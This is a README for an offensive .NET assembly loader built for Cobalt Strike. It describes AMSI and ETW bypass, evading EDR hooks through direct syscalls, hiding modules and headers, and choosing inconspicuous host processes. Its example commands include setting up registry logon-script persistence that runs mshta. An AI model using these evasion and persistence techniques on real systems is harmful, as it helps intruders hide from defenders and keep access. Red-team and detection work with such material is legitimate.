## Description:
ExecuteAssembly is an alternative of CS execute-assembly, built with C/C++ and it can be used to Load/Inject .NET assemblies by; reusing the host (spawnto) process loaded CLR Modules/AppDomainManager, Stomping Loader/.NET assembly PE DOS headers, Unlinking .NET related modules, bypassing ETW+AMSI, avoiding EDR hooks via NT static syscalls (x64) and hiding imports by dynamically resolving APIs via superfasthash hashing algorithm. 

## TLDR (Features):
- CLR related modules unlinking from PEB  data structures. (use MS "ListDLLs" utility instead of PH for confirmation)
- .NET Aseembly and Reflective DLL PE DOS headers stomping.
- Use of static hardcoded syscalls for bypassing EDR Hooks. (x64 support only for now, from WinXP to Win10 19042)
- CLR "AppDomain/AppDomainManager" enumeration and re-use (ICLRMetaHost->EnumerateLoadedRuntimes), just set the spawnto/host process to a known Windows .NET process.
- Dynamic Resolution of WIN32 APIs (PEB) using APIs corresponding hash (SuperFastHash)
- AMSI and ETW patching prior to loading .NET assemblies.
- .NET assembly bytes parsing and scanning for the CLR version to load/use.
- No use of GetProcAddress/LoadLibrary/GetModuleHandle for ETW bypass.
- CLR Hosting using v4 COM API & Reflective DLL injection


## Usage:
* <b><u>x64(syscalls):</u></b> this version depends mainly on the use of static syscalls to bypass EDR hooks, you can use this version to build the x64 version of the DLL only (x64 support only for now).
* <b><u>x86|x64(PEB):</u></b>  retrieves required API addresses dynamically at runtime by walking the PEB modules EAP tables and resolving APIs via superfasthash hash. however doesn't account for EDR hooks placed either on kernel32.dll or ntdll.dll, you can use this version to build both the x86 and x64 DLLs or only the x86 DLL and use x64(syscalls) version for building the x64 DLL to account for common EDR hooks.
* Build the required DLLs using VS2017 and/or Windows SDK 10.0.17134.0 (or compatible sdk versions).
  
* Make sure gzip is installed and the following artifacts are placed within the same folder then just load the aggressor script "ExecuteAssembly.cna":
   * ExecuteAssembly.cna
   * ExecuteAssembly-x64.dll
   * ExecuteAssembly-x86.dll
   * CLI Options:

      ``--dotnetassembly: .NET Assembly to load/inject.``

      ``--assemblyargs: .NET assembly arguments.``

      ``--unlink-modules: Unlink .NET related modules such as CLR/MsCoree related DLLs from PEB data structures.``

      ``--stomp-headers: Stomp .NET assembly and reflective DLL PE DOS headers.``

      ``--etw: Bypass event tracing on windows (ETW).``

      ``--amsi: Bypass AMSI.``

      ``--spawnto: Choose spawnto process, list of .NET binaries loading the CLR by default when executed:``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- PresentationHost.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- stordiag.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- ScriptRunner.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- caitstatic.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- Microsoft.Uev.SyncController.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- TsWpfWrp.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- UevAgentPolicyGenerator.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- UevAppMonitor.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- FileHistory.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- UevTemplateBaselineGenerator.exe``<br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;``- UevTemplateConfigItemGenerator.exe``<br>

* Check spawnto-list.txt for extra MS binaries loading the the CLR by default and are good candidates to set as a spawnto. (would avoid the known LOLBins unless if it is a dev's machine may be)

## Examples:	
- ``ExecuteAssembly --dotnetassembly /tmp/Seatbelt.exe --assemblyargs LogonSessions --unlink-modules --stomp-headers --amsi --etw --spawnto PresentationHost.exe``<br><br>
- ``ExecuteAssembly --amsi --etw --unlink-modules --stomp-headers --dotnetassembly /tmp/ghostpack/SharPersist.exe --assemblyargs -t reg -c "C:\Windows\SysWow64\mshta.exe C:\Users\admin\Downloads\Test2.hta" -k logonscript -m add --spawnto FileHistory.exe``<br><br>
- ``ExecuteAssembly --unlink-modules --stomp-headers --dotnetassembly /tmp/ghostpack/SharPersist.exe --assemblyargs -t reg -k "logonscript" -v "C:\Windows\SysWow64\mshta.exe C:\Users\admin\Downloads\Test.hta" -m remove --spawnto FileHistory.exe``<br><br>
- ``ExecuteAssembly --unlink-modules --amsi --dotnetassembly /tmp/ghostpack/SharpWMI.exe --assemblyargs action=query computername=localhost query="select * from win32_service" --spawnto FileHistory.exe``<br><br>
- ``ExecuteAssembly --amsi --etw --dotnetassembly /tmp/ghostpack/SharpWMI.exe --assemblyargs action=query query="select * from win32_process" --spawnto PresentationHost.exe``

## C2 Support:
Was created and tested mainly on cobalt strike, however it can be used with other C2 frameworks as well (MSF ..etc), just keep in mind that the reflective DLL DLLMAIN is expecting the one-liner payload as a parameter (lpReserved) in the following format (with no ".");
*  `AMSI_FLAG|ETW_FLAG|STOMPHEADERS_FLAG|UNLINKMODULES_FLAG|LL_FLAG.LENGTH_FLAG.B64_ENCODED_COMPRESSED_PAYLOAD [SPACE SEPARATED ARGUMENTS]`
   *  `AMSI_FLAG`: 0|1 (either 0 or 1)
   *  `ETW_FLAG`: 0|1
   *  `STOMPHEADERS_FLAG`: 0|1
   *  `UNLINKMODULES_FLAG`: 0|1
   *  `LENGTH_FLAG`: .NET assembly size in bytes
   *  `LL_FLAG`: length_of(LENGTH_FLAG) (just bear with me here or pretend you didn't read this)
   *  `B64_ENCODED_COMPRESSED_PAYLOAD`: Gzip compressed and base64 encoded .NET assembly.
   *  `[SPACE SEPARATED ARGUMENTS]`: .NET assembly arguments

## TODO:
- An alternative of RFLL, BOF + Named Pipes may be (not sure about long-duration running tasks)
- x86 support for static syscalls.
- Bug fixing and cleanup of any dangling pointers or mem-leaks i missed :p


## Known Issues:
- Support for SharpHound v2 and v3 (v2 used to work just fine, need to figure out what changed).
- .NET assembly size limitation ( < 1MB)

## Credits/References:
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/jthuraisamy/SysWhispers
* https://github.com/etormadiv/HostingCLR
* https://github.com/outflanknl/TamperETW/
* https://github.com/LloydLabs/Windows-API-Hashing
* http://www.rohitab.com/discuss/topic/42077-module-pebldr-hiding-all-4-methods-x64/
* https://gist.github.com/christophetd/37141ba273b447ff885c323c0a7aff93


